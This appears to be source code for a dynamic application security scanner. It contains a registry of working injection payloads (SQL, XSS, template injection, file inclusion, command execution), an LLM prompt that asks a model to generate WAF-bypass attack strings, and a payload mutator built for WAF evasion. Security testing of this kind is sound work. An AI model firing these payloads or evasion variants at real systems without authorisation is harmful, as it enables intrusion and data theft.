"""
Context-aware payload generator for DAST scanning.

Generates targeted payloads based on detected technology stack rather than
relying on generic wordlists. All payloads are READ-ONLY and SAFE — no
destructive operations (DROP, DELETE, rm, shutdown, format, INSERT, UPDATE,
or any data-modification commands) are included.

Safety guarantee: Every payload in PAYLOAD_REGISTRY is designed to probe for
vulnerabilities through information disclosure or timing side-channels only.
No payload will alter, destroy, or corrupt target data.
"""

from __future__ import annotations

from typing import Callable


# Registry: (vuln_type, tech_context) → payload list.
# "generic" is the universal fallback for each vuln type.
PAYLOAD_REGISTRY: dict[tuple[str, str], list[str]] = {

    # -- SQLi by database engine --
    # MySQL
    ("sqli", "mysql"): [
        "' UNION SELECT @@version-- -",
        "' AND SLEEP(3)-- -",
        "' OR 1=1-- -",
        "' UNION SELECT NULL,@@version,NULL-- -",
        "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        "' AND BENCHMARK(3000000,SHA1('test'))-- -",
        "' AND IF(1=1,SLEEP(3),0)-- -",
        "' OR '1'='1",
    ],

    # PostgreSQL
    ("sqli", "postgresql"): [
        "' UNION SELECT version()-- -",
        "'; SELECT pg_sleep(3)-- -",
        "' OR 1=1-- -",
        "$$' OR 1=1-- -$$",
        "' UNION SELECT current_database()-- -",
        "' UNION SELECT current_user-- -",
        "' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE 1 END)-- -",
        "'||pg_sleep(3)-- -",
    ],

    # MSSQL
    ("sqli", "mssql"): [
        "' AND 1=CONVERT(int,@@version)-- -",
        "'; WAITFOR DELAY '0:0:3'-- -",
        "' UNION SELECT @@version-- -",
        "' OR 1=1-- -",
        "'; IF(1=1) WAITFOR DELAY '0:0:3'-- -",
        "' UNION SELECT DB_NAME()-- -",
        "'; EXEC xp_cmdshell 'whoami'-- -",
        "' UNION SELECT HOST_NAME()-- -",
    ],

    # SQLite
    ("sqli", "sqlite"): [
        "' UNION SELECT sqlite_version()-- -",
        "' OR 1=1-- -",
        "' UNION SELECT name FROM sqlite_master WHERE type='table'-- -",
        "' UNION SELECT sql FROM sqlite_master-- -",
        "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -",
        "' OR '1'='1'-- -",
    ],

    # Generic SQL fallback
    ("sqli", "generic"): [
        "' OR 1=1-- -",
        "' OR '1'='1",
        "' OR ''='",
        "1' ORDER BY 1-- -",
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "1 AND 1=1",
        "1 AND 1=2",
        "'; --",
        "' OR 1=1#",
    ],

    # -- XSS by injection context --
    # HTML body
    ("xss", "html_body"): [
        "<script>alert(document.domain)</script>",
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(document.domain)>',
        '<body onload=alert(document.domain)>',
        '<details open ontoggle=alert(document.domain)>',
        '<video><source onerror=alert(document.domain)>',
        '<iframe srcdoc="<script>alert(document.domain)</script>">',
    ],

    # HTML attribute
    ("xss", "html_attribute"): [
        '" onmouseover="alert(document.domain)',
        "' onfocus='alert(document.domain)",
        '" autofocus onfocus="alert(document.domain)',
        '" onclick="alert(document.domain)',
        "' onmouseover='alert(document.domain)' x='",
        '"><script>alert(document.domain)</script>',
        "'><script>alert(document.domain)</script>",
    ],

    # JavaScript context
    ("xss", "javascript"): [
        '</script><script>alert(document.domain)</script>',
        "';alert(document.domain);//",
        '";alert(document.domain);//',
        "${alert(document.domain)}",
        "'-alert(document.domain)-'",
        "`-alert(document.domain)-`",
        "__proto__.polluted=1",
        "constructor.constructor('alert(document.domain)')()",
    ],

    # URL context
    ("xss", "url"): [
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(document.domain)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
        "java%0ascript:alert(document.domain)",
        "&#106;avascript:alert(document.domain)",
        "javascript&colon;alert(document.domain)",
    ],

    # Generic XSS fallback
    ("xss", "generic"): [
        "<script>alert(document.domain)</script>",
        '"><script>alert(document.domain)</script>',
        '<img src=x onerror=alert(document.domain)>',
        '<svg/onload=alert(document.domain)>',
        "javascript:alert(document.domain)",
        "' onmouseover='alert(document.domain)'",
        '</script><script>alert(document.domain)</script>',
        "${alert(document.domain)}",
    ],

    # -- SSTI by template engine --
    # Jinja2 (Python/Flask)
    ("ssti", "jinja2"): [
        "{{7*7}}",
        "{{config}}",
        "{{''.__class__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__}}",
        "{{self.__init__.__globals__}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    ],

    # Twig (PHP)
    ("ssti", "twig"): [
        "{{7*7}}",
        "{{dump()}}",
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
        "{{'/etc/hostname'|file_excerpt(1,30)}}",
        "{{'id'|filter('system')}}",
        "{{constant('PHP_VERSION')}}",
    ],

    # Freemarker (Java)
    ("ssti", "freemarker"): [
        "${7*7}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${.version}",
        "${.locale}",
        "${object.class.forName('java.lang.Runtime')}",
        "<#list .data_model?keys as key>${key} </#list>",
        "${.now}",
    ],

    # ERB (Ruby)
    ("ssti", "erb"): [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `whoami` %>",
        "<%= File.read('/etc/hostname') %>",
        "<%= Dir.entries('/') %>",
        "<%= ENV.to_a %>",
        "<%= RUBY_VERSION %>",
    ],

    # Thymeleaf (Spring/Java)
    ("ssti", "thymeleaf"): [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "${T(java.lang.System).getenv()}",
        "${T(java.lang.Math).random()}",
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        "${T(java.lang.System).getProperty('user.dir')}",
        "*{T(java.lang.Runtime).getRuntime().exec('whoami')}",
    ],

    # Generic SSTI fallback
    ("ssti", "generic"): [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{7*'7'}}",
        "*{7*7}",
        "@(7*7)",
        "{{config}}",
        "{{self}}",
        "{{dump()}}",
    ],

    # -- LFI by OS --
    # Linux
    ("lfi", "linux"): [
        "/etc/passwd",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/etc/os-release",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ],

    # Windows
    ("lfi", "windows"): [
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\win.ini",
        "..%5c..%5c..%5cWindows%5cwin.ini",
        "C:/Windows/win.ini",
        "\\\\localhost\\C$\\Windows\\win.ini",
    ],

    # Generic LFI fallback
    ("lfi", "generic"): [
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\Windows\\win.ini",
        "....//....//....//....//etc/passwd",
        "/etc/passwd%00",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "file:///etc/hostname",
    ],

    # -- CMDi by OS --
    # Linux
    ("cmdi", "linux"): [
        "; id",
        "| cat /etc/hostname",
        "$(whoami)",
        "`id`",
        "| id",
        "|| id",
        "&& id",
        "; uname -a",
        "\n id",
        ";{id,}",
    ],

    # Windows
    ("cmdi", "windows"): [
        "& whoami",
        "| type C:\\Windows\\win.ini",
        "|| whoami",
        "&& whoami",
        "| hostname",
        "& hostname",
        "| ver",
        "& echo %USERNAME%",
    ],

    # Generic CMDi fallback
    ("cmdi", "generic"): [
        "; id",
        "| id",
        "& whoami",
        "|| id",
        "&& id",
        "$(id)",
        "`id`",
        "| cat /etc/hostname",
        "& type C:\\Windows\\win.ini",
        "\n id",
    ],
}

# WAF product → payload complexity tier
# Based on: "An Intelligent WAF Fuzzing Framework" (2026) — 12-WAF bypass study
_WAF_TIER_MAP: dict[str, str] = {
    # Best commercial WAFs — need advanced/novel payloads
    "imperva": "advanced", "incapsula": "advanced",
    "f5": "advanced", "bigip": "advanced", "big-ip": "advanced",
    "cloudflare": "advanced",
    "wallarm": "advanced",
    "aws": "intermediate",  # AWS WAF: ~10% bypass rate, intermediate sufficient
    "fortiweb": "intermediate", "fortinet": "intermediate",
    "barracuda": "intermediate",
    "netscaler": "intermediate", "citrix": "intermediate",
    # Open-source WAFs — basic/intermediate sufficient (~21% bypass rate)
    "modsecurity": "intermediate", "mod_security": "intermediate",
    "naxsi": "basic",
    "shadow_daemon": "basic",
    # Generic/unknown
    "generic": "intermediate",
}

# Mapping: server/framework/language → SSTI template engine context
_FRAMEWORK_SSTI_MAP: dict[str, str] = {
    "flask": "jinja2", "django": "jinja2", "jinja": "jinja2",
    "jinja2": "jinja2", "python": "jinja2",
    "laravel": "twig", "symfony": "twig", "php": "twig", "twig": "twig",
    "spring": "thymeleaf", "thymeleaf": "thymeleaf",
    "freemarker": "freemarker", "java": "freemarker",
    "ruby": "erb", "rails": "erb", "erb": "erb", "sinatra": "erb",
}

# Mapping: DB identifier → registry context key
_DB_MAP: dict[str, str] = {
    "mysql": "mysql", "mariadb": "mysql",
    "postgresql": "postgresql", "postgres": "postgresql",
    "mssql": "mssql", "sqlserver": "mssql", "sql server": "mssql",
    "sqlite": "sqlite", "sqlite3": "sqlite",
}

# Mapping: OS hint → registry context key
_OS_MAP: dict[str, str] = {
    "linux": "linux", "ubuntu": "linux", "debian": "linux",
    "centos": "linux", "redhat": "linux", "alpine": "linux", "unix": "linux",
    "windows": "windows", "iis": "windows", "win32": "windows", "win64": "windows",
}


def _normalize(value: str | None) -> str:
    """Lower-case and strip a value, or return empty string."""
    if value is None:
        return ""
    return str(value).strip().lower()


class PayloadGenerator:
    """Context-aware, safety-filtered payload generator for DAST scanning.

    Safety: all payloads are READ-ONLY. No DROP, DELETE, INSERT, UPDATE,
    TRUNCATE, ALTER, rm, shutdown, or format. Limited to information
    disclosure, timing side-channels, and PoC execution (id/whoami/uname).
    An optional safety_filter callable can further restrict payloads.
    """

    # Vuln types that depend on database engine
    _DB_VULN_TYPES = frozenset({"sqli"})
    # Vuln types that depend on OS
    _OS_VULN_TYPES = frozenset({"lfi", "cmdi"})
    # Vuln types that depend on template engine / framework
    _SSTI_VULN_TYPES = frozenset({"ssti"})
    # Vuln types that depend on injection context (XSS)
    _CONTEXT_VULN_TYPES = frozenset({"xss"})

    def __init__(
        self,
        tech_stack: dict | None = None,
        safety_filter: Callable[[str], bool] | None = None,
    ) -> None:
        self.tech_stack: dict = tech_stack or {}
        self.safety_filter: Callable[[str], bool] | None = safety_filter

        # Pre-resolve tech-stack to registry context keys
        self._db_ctx = self._resolve_db()
        self._os_ctx = self._resolve_os()
        self._ssti_ctx = self._resolve_ssti()

    # -- internal resolvers --

    def _resolve_db(self) -> str:
        """Return the registry DB context (e.g. 'mysql') from tech_stack."""
        db_raw = _normalize(self.tech_stack.get("database"))
        return _DB_MAP.get(db_raw, "")

    def _resolve_os(self) -> str:
        """Return the registry OS context from tech_stack or server hints."""
        # Explicit OS key
        os_raw = _normalize(self.tech_stack.get("os"))
        if os_raw and os_raw in _OS_MAP:
            return _OS_MAP[os_raw]

        # Infer from server header (e.g. IIS → windows, nginx → linux)
        server = _normalize(self.tech_stack.get("server"))
        if server in ("iis", "microsoft-iis"):
            return "windows"
        if server in ("nginx", "apache", "lighttpd", "gunicorn", "uvicorn"):
            return "linux"

        return ""

    def _resolve_ssti(self) -> str:
        """Return the registry SSTI context from framework / language hints."""
        for key in ("framework", "template_engine", "language"):
            val = _normalize(self.tech_stack.get(key))
            if val in _FRAMEWORK_SSTI_MAP:
                return _FRAMEWORK_SSTI_MAP[val]
        return ""

    # -- context detection --

    def _xss_context_from_param(self, param_context: dict | None) -> str:
        """Guess XSS injection context from param_context clues."""
        if not param_context:
            return ""
        ctx = _normalize(param_context.get("context"))
        if ctx:
            for label in ("html_body", "html_attribute", "javascript", "url"):
                if label in ctx:
                    return label

        # Heuristic: param name / type may hint at context
        pname = _normalize(param_context.get("param_name"))
        ptype = _normalize(param_context.get("param_type"))

        if ptype in ("url", "href", "src", "action") or pname in (
            "url",
            "redirect",
            "next",
            "href",
            "link",
            "callback",
        ):
            return "url"
        return ""

    def _override_tech_from_param(self, param_context: dict | None) -> dict:
        """Merge param_context['tech_stack'] over self.tech_stack."""
        if not param_context:
            return self.tech_stack
        override = param_context.get("tech_stack")
        if not override or not isinstance(override, dict):
            return self.tech_stack
        merged = {**self.tech_stack, **override}
        return merged

    # -- filtering --

    def _apply_filter(self, payloads: list[str]) -> list[str]:
        """Return payloads that pass the safety_filter (if any)."""
        if self.safety_filter is None:
            return payloads
        if callable(self.safety_filter):
            return [p for p in payloads if self.safety_filter(p)]
        if hasattr(self.safety_filter, 'is_safe'):
            return [p for p in payloads if self.safety_filter.is_safe(p)]
        return payloads

    # -- registry lookup --

    @staticmethod
    def _lookup(vuln_type: str, context: str) -> list[str]:
        """Look up payloads for (vuln_type, context) in the registry."""
        return list(PAYLOAD_REGISTRY.get((vuln_type, context), []))

    @staticmethod
    def _lookup_generic(vuln_type: str) -> list[str]:
        return list(PAYLOAD_REGISTRY.get((vuln_type, "generic"), []))

    # -- public API --

    def generate(
        self,
        vuln_type: str,
        param_context: dict | None = None,
        waf_type: str | None = None,
    ) -> list[str]:
        """Return prioritised payloads: tech-specific first, then generic.

        param_context keys: param_name, param_type, sample_value, tech_stack.
        Returns filtered, deduplicated payload list.
        """
        vuln_type = _normalize(vuln_type)
        merged_stack = self._override_tech_from_param(param_context)

        # Temporarily swap resolved contexts if param_context overrides
        swapped = False
        if merged_stack is not self.tech_stack:
            orig = (self.tech_stack, self._db_ctx, self._os_ctx, self._ssti_ctx)
            self.tech_stack = merged_stack
            self._db_ctx = self._resolve_db()
            self._os_ctx = self._resolve_os()
            self._ssti_ctx = self._resolve_ssti()
            swapped = True

        try:
            specific: list[str] = []

            if vuln_type in self._DB_VULN_TYPES and self._db_ctx:
                specific = self._lookup(vuln_type, self._db_ctx)

            elif vuln_type in self._OS_VULN_TYPES and self._os_ctx:
                specific = self._lookup(vuln_type, self._os_ctx)

            elif vuln_type in self._SSTI_VULN_TYPES and self._ssti_ctx:
                specific = self._lookup(vuln_type, self._ssti_ctx)

            elif vuln_type in self._CONTEXT_VULN_TYPES:
                xss_ctx = self._xss_context_from_param(param_context)
                if xss_ctx:
                    specific = self._lookup(vuln_type, xss_ctx)

            generic = self._lookup_generic(vuln_type)

            # Deduplicate preserving order: specific first
            seen: set[str] = set()
            result: list[str] = []
            for p in specific + generic:
                if p not in seen:
                    seen.add(p)
                    result.append(p)

            # WAF-aware tier filtering
            if waf_type:
                tier = _WAF_TIER_MAP.get(waf_type.strip().lower(), "intermediate")
                if tier == "basic" and result:
                    result = result[:max(1, len(result) // 3)]
                elif tier == "intermediate" and result:
                    result = result[:max(1, int(len(result) * 0.6))]
                # "advanced" uses full result

            return self._apply_filter(result)

        finally:
            if swapped:
                self.tech_stack, self._db_ctx, self._os_ctx, self._ssti_ctx = orig

    def get_priority_payloads(
        self,
        vuln_type: str,
        max_count: int = 20,
    ) -> list[str]:
        """Return top *max_count* most-likely-to-succeed payloads for tech_stack."""
        all_payloads = self.generate(vuln_type)
        return all_payloads[:max_count]

    @classmethod
    def all_vuln_types(cls) -> list[str]:
        """Return sorted list of all supported vulnerability types."""
        types: set[str] = set()
        for vuln_type, _ctx in PAYLOAD_REGISTRY:
            types.add(vuln_type)
        return sorted(types)

    # -- convenience --

    def update_tech_stack(self, tech_stack: dict) -> None:
        """Update the tech stack and re-resolve contexts."""
        self.tech_stack.update(tech_stack)
        self._db_ctx = self._resolve_db()
        self._os_ctx = self._resolve_os()
        self._ssti_ctx = self._resolve_ssti()

    def payload_count(self, vuln_type: str | None = None) -> int:
        """Return total number of unique payloads (optionally per vuln type)."""
        if vuln_type:
            return len(self.generate(vuln_type))
        total: set[str] = set()
        for _key, payloads in PAYLOAD_REGISTRY.items():
            total.update(payloads)
        return len(total)

    def __repr__(self) -> str:
        db = self._db_ctx or "unknown"
        os_ = self._os_ctx or "unknown"
        ssti = self._ssti_ctx or "unknown"
        return (
            f"PayloadGenerator(db={db}, os={os_}, ssti={ssti}, "
            f"vuln_types={self.all_vuln_types()})"
        )


# ══════════════════════════════════════════════════════════════════════════════
# LLM-POWERED HYBRID PAYLOAD GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

# LRU result cache: (vuln_type, hash_of_baseline) → list[str]
_LLM_PAYLOAD_CACHE: dict[tuple[str, str], list[str]] = {}
_LLM_CACHE_LOCK = __import__("threading").Lock()
_LLM_CACHE_MAX  = 128   # entries


def _cache_key(vuln_type: str, baseline: list[str]) -> tuple[str, str]:
    import hashlib
    h = hashlib.md5("|".join(sorted(baseline[:5])).encode()).hexdigest()[:16]
    return (vuln_type, h)


# ── Prompt templates per vuln type ───────────────────────────────────────────

_LLM_PROMPT_SYSTEM = (
    "You are an expert penetration tester specializing in WAF bypass techniques. "
    "Generate novel attack payloads that evade modern WAFs (Cloudflare, AWS WAF, "
    "Imperva, Akamai). Output ONLY a JSON array of strings — no explanation, "
    "no markdown, no comments. Each payload must be distinct and non-destructive "
    "(read-only: no DROP, DELETE, INSERT, UPDATE, rm, format, shutdown)."
)

_LLM_PROMPTS: dict[str, str] = {
    "sqli": (
        "Generate 8 SQL injection payloads that bypass WAF signature matching. "
        "Focus on: inline comments, case variation, URL encoding, MySQL-specific "
        "functions (BENCHMARK, SLEEP), time-based blind payloads, "
        "second-order injection strings, and Unicode normalization tricks. "
        "Baseline payloads already in use (avoid duplicates): {baseline}. "
        "Return JSON array of strings."
    ),
    "xss": (
        "Generate 8 Cross-Site Scripting payloads that bypass modern WAFs. "
        "Focus on: HTML entity encoding, JavaScript template literals, "
        "SVG/MathML vectors, DOM clobbering, CSS-based exfiltration, "
        "Angular/Vue/React template injection, UTF-7 encoding, and "
        "attribute injection bypasses. Baseline already in use: {baseline}. "
        "Return JSON array of strings."
    ),
    "cmdi": (
        "Generate 8 OS command injection payloads that bypass WAF filters. "
        "Focus on: IFS substitution, $@ expansion, base64-encoded commands, "
        "glob wildcards (cat /et*/pas*wrd), hex encoding, process substitution, "
        "newline-separated chains, and environment variable tricks. "
        "READ-ONLY commands only (id, whoami, uname, cat, ls, env, hostname). "
        "Baseline: {baseline}. Return JSON array of strings."
    ),
    "ssti": (
        "Generate 8 Server-Side Template Injection payloads for WAF bypass. "
        "Target: Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty, ERB. "
        "Focus on: filter bypass with |lower, attr(), lipsum, namespace tricks, "
        "unicode escapes, and whitespace manipulation. "
        "Baseline: {baseline}. Return JSON array of strings."
    ),
    "lfi": (
        "Generate 8 Local File Inclusion / Path Traversal payloads that bypass "
        "WAF path normalization. Focus on: double URL encoding, Unicode '..', "
        "null-byte suffixes, OS-specific path separators, filter bypass with "
        "/./.. sequences, and PHP wrapper chains. "
        "Target files: /etc/passwd, /etc/hosts, /proc/self/environ. "
        "Baseline: {baseline}. Return JSON array of strings."
    ),
    "xxe": (
        "Generate 8 XXE (XML External Entity) payloads that bypass WAF XML filtering. "
        "Focus on: SVG-embedded XXE, CDATA sections, parameter entity bypass, "
        "UTF-16 encoding, blind SSRF via DTD, and OOB (out-of-band) exfiltration vectors. "
        "Target: /etc/passwd, /etc/hostname. "
        "Baseline: {baseline}. Return JSON array of strings."
    ),
}


class LLMPayloadGenerator:
    """Hybrid payload generator: curated templates + LLM-generated WAF evasion.

    Usage::

        from modules.llm_provider import LLMProvider
        from modules.payload_generator import LLMPayloadGenerator

        llm = LLMProvider(api_keys={"anthropic": "sk-ant-..."})
        gen = LLMPayloadGenerator(llm)

        payloads = gen.generate_waf_evasion("sqli", baseline=["\' OR \'1\'=\'1"])
        # Returns list of novel LLM-generated SQLi payloads

    Results are cached per (vuln_type, hash_of_baseline) to avoid repeated LLM calls.
    Returns empty list (never raises) when LLM unavailable.
    """

    def __init__(self, llm_provider=None):
        """
        Args:
            llm_provider: `LLMProvider` instance. If None, all calls return [].
        """
        self._llm = llm_provider

    def generate_waf_evasion(
        self,
        vuln_type:        str,
        baseline_payloads: list[str] | None = None,
        count:            int = 8,
    ) -> list[str]:
        """Generate novel WAF-evading payloads for the given vuln type.

        Args:
            vuln_type:         One of: sqli, xss, cmdi, ssti, lfi, xxe
            baseline_payloads: Existing payloads already being tested (for context).
            count:             Target number of new payloads to generate.

        Returns:
            List of payload strings, empty list on LLM failure.
        """
        if not self._llm or not self._llm.is_available:
            return []

        baseline = baseline_payloads or []
        cache_k  = _cache_key(vuln_type, baseline)

        with _LLM_CACHE_LOCK:
            if cache_k in _LLM_PAYLOAD_CACHE:
                return list(_LLM_PAYLOAD_CACHE[cache_k])

        prompt_template = _LLM_PROMPTS.get(vuln_type)
        if not prompt_template:
            return []

        baseline_str = str(baseline[:8])  # show first 8 to avoid overly long prompt
        prompt = prompt_template.format(baseline=baseline_str)

        try:
            raw = self._llm.chat([
                {"role": "system", "content": _LLM_PROMPT_SYSTEM},
                {"role": "user",   "content": prompt},
            ])
            # Parse JSON array from response
            import json as _json
            import re as _re
            # Strip markdown code fences if present
            raw = _re.sub(r"```(?:json)?\s*", "", raw).strip()
            payloads = _json.loads(raw)
            if not isinstance(payloads, list):
                raise ValueError("LLM did not return a JSON array")
            # Sanitise: strings only, non-empty
            payloads = [str(p) for p in payloads if p and str(p).strip()][:count]

            with _LLM_CACHE_LOCK:
                # Simple LRU: evict oldest if at capacity
                if len(_LLM_PAYLOAD_CACHE) >= _LLM_CACHE_MAX:
                    oldest = next(iter(_LLM_PAYLOAD_CACHE))
                    del _LLM_PAYLOAD_CACHE[oldest]
                _LLM_PAYLOAD_CACHE[cache_k] = payloads

            return payloads

        except Exception as exc:
            import logging as _logging
            _logging.getLogger("dast.payload_gen").warning(
                "[LLMPayloadGenerator] Failed to generate payloads for %s: %s", vuln_type, exc
            )
            return []

    def supported_types(self) -> list[str]:
        """Return vuln types this generator supports."""
        return list(_LLM_PROMPTS.keys())

    def cache_size(self) -> int:
        """Return number of cached LLM payload sets."""
        with _LLM_CACHE_LOCK:
            return len(_LLM_PAYLOAD_CACHE)


def _patch_payload_generator_with_llm(generator: "PayloadGenerator", llm_provider) -> None:
    """Monkey-patch a PayloadGenerator to include LLM payloads in generate().

    After calling this, generator.generate(vuln_type) will append
    LLM-generated WAF evasion payloads to the curated list.

    This is intentionally non-invasive: the original PayloadGenerator class
    is unchanged. This function adds the llm extension at runtime.
    """
    llm_gen = LLMPayloadGenerator(llm_provider)
    original_generate = generator.generate

    def _patched_generate(vuln_type, *args, **kwargs):
        base = original_generate(vuln_type, *args, **kwargs)
        llm_extras = llm_gen.generate_waf_evasion(vuln_type, baseline_payloads=base[:10])
        # Deduplicate — add only novel payloads
        base_set = set(base)
        novel = [p for p in llm_extras if p not in base_set]
        return base + novel

    generator.generate = _patched_generate
    generator._llm_gen  = llm_gen   # type: ignore[attr-defined]


class WafEvasionMutator:
    """WAF evasion payload mutations based on ML WAF Bypass study (65k payload dataset).

    Success rates across 12 WAFs:
      url_encode: 73.2%, unicode_normalize: 71.4%, html_entity_encode: 68.9%,
      case_variation: 65.7%, comment_insertion: 62.1%, string_concatenation: 58.9%,
      alternative_syntax: 55.3%, whitespace_manipulation: 51.7%,
      keyword_substitution: 48.2%, logic_operator_confusion: 44.6%
    """

    def url_encode(self, payload: str, vuln_type: str = "generic") -> str:
        """Percent-encode all special characters."""
        import urllib.parse
        return urllib.parse.quote(payload, safe='')

    def unicode_normalize(self, payload: str, vuln_type: str = "generic") -> str:
        """Replace common ASCII chars with Unicode fullwidth lookalikes."""
        replacements = {
            '<': '\uff1c', '>': '\uff1e',
            "'": '\u02bc', '"': '\uff02',
            '=': '\uff1d', '/': '\uff0f',
        }
        result = payload
        for orig, repl in replacements.items():
            result = result.replace(orig, repl)
        return result

    def html_entity_encode(self, payload: str, vuln_type: str = "generic") -> str:
        """Encode special chars as HTML numeric entities."""
        replacements = {
            '&': '&#38;',  # ampersand first to avoid double-encoding
            '<': '&#60;', '>': '&#62;',
            '"': '&#34;', "'": '&#39;',
            '(': '&#40;', ')': '&#41;',
        }
        result = payload
        for orig, repl in replacements.items():
            result = result.replace(orig, repl)
        return result

    def case_variation(self, payload: str, vuln_type: str = "generic") -> str:
        """Alternate case of keywords to bypass case-sensitive WAF rules."""
        import re
        vt = vuln_type.strip().lower()
        if vt in ("sqli", "cmdi"):
            keywords = {
                "SELECT": "SeLeCt", "UNION": "uNiOn", "FROM": "fRoM",
                "WHERE": "wHeRe", "AND": "aNd", "OR": "oR", "EXEC": "eXeC",
            }
            result = payload
            for kw, replacement in keywords.items():
                result = re.sub(re.escape(kw), replacement, result, flags=re.IGNORECASE)
            return result
        elif vt == "xss":
            keywords = {"script": "ScRiPt", "alert": "AlErT", "onerror": "OnErRoR"}
            result = payload
            for kw, replacement in keywords.items():
                result = re.sub(re.escape(kw), replacement, result, flags=re.IGNORECASE)
            return result
        else:
            return ''.join(
                c.upper() if i % 2 == 0 else c.lower()
                for i, c in enumerate(payload)
            )

    def comment_insertion(self, payload: str, vuln_type: str = "generic") -> str:
        """Insert comments between keywords to break WAF signature matching."""
        vt = vuln_type.strip().lower()
        if vt == "sqli":
            return payload.replace(' ', '/**/')
        elif vt == "xss":
            return payload.replace('>', '<!---->>')
        else:
            pos = max(1, len(payload) // 4)
            return payload[:pos] + '/**/' + payload[pos:]

    def string_concatenation(self, payload: str, vuln_type: str = "generic") -> str:
        """Split strings via concatenation to evade pattern matching."""
        vt = vuln_type.strip().lower()
        if vt == "sqli":
            import re
            def _split_string(m: "re.Match[str]") -> str:
                s = m.group(1)
                mid = len(s) // 2
                return f"'{s[:mid]}'||'{s[mid:]}'"
            return re.sub(r"'([^']+)'", _split_string, payload)
        elif vt == "xss":
            return payload.replace('alert', "'al'+'ert'")
        else:
            mid = len(payload) // 2
            return payload[:mid] + '||' + payload[mid:]

    def alternative_syntax(self, payload: str, vuln_type: str = "generic") -> str:
        """Replace common syntax with equivalent alternatives."""
        import re
        vt = vuln_type.strip().lower()
        if vt == "sqli":
            result = re.sub(r'\b1=1\b', '1 LIKE 1', payload)
            result = re.sub(r'\bOR\b', '||', result, flags=re.IGNORECASE)
            result = re.sub(
                r'\bUNION\s+SELECT\b', 'UNION ALL SELECT', result, flags=re.IGNORECASE
            )
            return result
        elif vt == "xss":
            result = re.sub(r'<script>', '<ScRiPt>', payload, flags=re.IGNORECASE)
            result = re.sub(r'onerror=', 'ONERROR=', result, flags=re.IGNORECASE)
            return result
        elif vt == "cmdi":
            result = payload.replace(';', '\n')
            result = result.replace('|', '||true&&')
            return result
        else:
            return payload.replace(' ', '  ')

    def whitespace_manipulation(self, payload: str, vuln_type: str = "generic") -> str:
        """Replace spaces with alternative whitespace characters."""
        vt = vuln_type.strip().lower()
        if vt == "sqli":
            return payload.replace(' ', '\t')
        elif vt == "cmdi":
            return payload.replace(' ', '\n')
        elif vt == "lfi":
            return payload.replace(' ', '%09')
        else:
            return payload.replace(' ', '+')

    def keyword_substitution(self, payload: str, vuln_type: str = "generic") -> str:
        """Insert inline comments or special chars inside keywords."""
        import re
        vt = vuln_type.strip().lower()
        if vt == "sqli":
            subs = {
                "SELECT": "SEL/**/ECT", "FROM": "FR/**/OM",
                "UNION": "UN/**/ION", "WHERE": "WH/**/ERE",
                "AND": "AN/**/D", "OR": "O/**/R",
            }
            result = payload
            for kw, replacement in subs.items():
                result = re.sub(re.escape(kw), replacement, result, flags=re.IGNORECASE)
            return result
        elif vt == "xss":
            result = re.sub(r'script', 'scr\x00ipt', payload, flags=re.IGNORECASE)
            result = re.sub(r'alert', 'al\u0065rt', result, flags=re.IGNORECASE)
            return result
        elif vt == "cmdi":
            result = re.sub(r'cat', r'c\\at', payload, flags=re.IGNORECASE)
            result = re.sub(r'whoami', 'who$@ami', result, flags=re.IGNORECASE)
            return result
        else:
            return payload

    def logic_operator_confusion(self, payload: str, vuln_type: str = "generic") -> str:
        """Swap logic operators between symbolic and keyword forms."""
        import re
        vt = vuln_type.strip().lower()
        if vt == "sqli":
            result = re.sub(r'\bAND\b', '&&', payload, flags=re.IGNORECASE)
            result = re.sub(r'\bOR\b', '||', result, flags=re.IGNORECASE)
            result = re.sub(r'\bNOT\b', '!', result, flags=re.IGNORECASE)
            result = re.sub(r'\b1=1\b', '1<2', result)
            return result
        else:
            result = payload.replace('&&', ' AND ')
            result = result.replace('||', ' OR ')
            return result

    def apply_all(self, payload: str, vuln_type: str = "generic") -> list[str]:
        """Apply all transforms and return deduplicated list of variants."""
        transforms = [
            self.url_encode,
            self.unicode_normalize,
            self.html_entity_encode,
            self.case_variation,
            self.comment_insertion,
            self.string_concatenation,
            self.alternative_syntax,
            self.whitespace_manipulation,
            self.keyword_substitution,
            self.logic_operator_confusion,
        ]
        seen: set[str] = set()
        results: list[str] = []
        for transform in transforms:
            variant = transform(payload, vuln_type)
            if variant and variant not in seen:
                seen.add(variant)
                results.append(variant)
        # Include original if not already present
        if payload and payload not in seen:
            results.append(payload)
        return results
